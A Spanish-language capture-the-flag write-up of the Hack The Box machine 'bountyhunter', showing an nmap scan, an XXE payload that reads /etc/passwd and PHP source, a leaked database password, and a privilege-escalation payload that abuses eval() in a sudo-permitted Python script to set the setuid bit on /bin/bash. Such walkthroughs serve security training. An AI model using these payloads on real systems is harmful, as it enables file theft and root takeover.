---
layout: single
title: bountyhunter - Hack The Box
excerpt: "La máquina bountyhunter es una máquina de dificultad fácil de hackthebox, la máquina contempla una vulnerabilidad xxe(XML external entities), en lo cual extraemos una contraseña que nos sirve para ingresar a la máquina. Luego mediante un script en python logramos elevar nuestro privilegio a root."
date: 2022-09-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - xxe
  - abusing sudoers
---

![](/assets/images/htb-writeup-bountyhunter/bountyhunter_logo.png)

## Enumeración
Arrancamos con un reconocimiento con nmap.

```ruby

# Nmap 7.92 scan initiated Thu Sep 22 10:51:21 2022 as: nmap -sCV -p22,80 -oN targeted 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 22 10:51:39 2022 -- 1 IP address (1 host up) scanned in 18.00 seconds
```

Una vez entramos a la web nos dirigimos a http://10.10.11.100/log_submit.php.Y vemos un campo que nos pide 4 input y los refleja en la web.

![](/assets/images/htb-writeup-bountyhunter/xml.png)

Interceptamos la petición post para ver como se envía la data. y obtenemos una cadena en base64 y la decodificamos. 

```bash
echo "PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPnRlc3Q8L2N3ZT4KCQk8Y3Zzcz50ZXN0PC9jdnNzPgoJCTxyZXdhcmQ+dGVzdDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==" | base64 -d; echo
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>test</title>
                <cwe>test</cwe>
                <cvss>test</cvss>
                <reward>test</reward>
                </bugreport>
```

## XXE

Ya que la información viaja en formato xml, probamos un XML External Entity, para ver si tenemos lectura de archivos locales de la máquina.Dicho payload hay que decodificarlo en base64 y luego en urlencode.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<bugreport>
<title>&example;</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>test</reward>
</bugreport>
```

![](/assets/images/htb-writeup-bountyhunter/etc-passwd.png)

Podemos leer archivos arbitrarios de la maquina victima.Ahora lo que procede es además de usar el wrapper file, usamos el php://filter/convert.base64-encode/resource= , para poder leer archivos php. Una vez creado el payload le indicamos la ruta /var/www/html/db.php, y extraemos un archivo de configuración que nos sirve para ingresar a la máquina.

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

![](/assets/images/htb-writeup-bountyhunter/sshpass.png)


## Elevación de privilegios

```bash
development@bountyhunter:/opt/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Por lo que vemos podemos ejecutar un script en python como root, asi que empezamos a comprenderlo para ver de que forma podemos ejecutar comandos.

```python

#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Lo que el script hace es crear un ticket. Para que dicho ticket se cree tiene que haber una especie de "reglas", la primera verifica que el archivo que indiquemos termine en extensión .md, la segunda verificación es que la primera línea contemple # Skytrain Inc, la tercera verificacion debe tener la segunda línea ## Ticket to testing,La cuarta verificación debe tener la  tercer línea  __Ticket Code:__  y la quinta linea debe tener una suma que su resultado sea modulo de 4. Luego las últimas dos líneas debe tener  ##Issued: 2021/04/06 ,y  #End Ticket.Primero probamos el siguiente payload,pero no llegamos a nada.

```python
# Skytrain Inc
## Ticket to 'test',__import__("os").system("whoami"),'testing'
__Ticket Code:__
**11+321+1**
##Issued: 2021/04/06
#End Ticket
```
Entonces paso al siguiente sospecha de ejecutar comandos.

```python
# Skytrain Inc
## Ticket to testing
__Ticket Code:__
**11+321+1 and __import__("os").system("chmod +s /bin/bash")**
##Issued: 2021/04/06
#End Ticket

```

Y logramos ejecutar comandos.

```bash
development@bountyhunter:/opt/skytrain_inc$ sudo -u root /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
Please enter the path to the ticket file.
/tmp/payload.md
Destination: testing
Invalid ticket.
development@bountyhunter:/opt/skytrain_inc$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
development@bountyhunter:/opt/skytrain_inc$ /bin/bash -p
bash-5.0# cat /root/root.txt
bb3be873edadacc2c3e7f336b17c64c3
bash-5.0# 
```
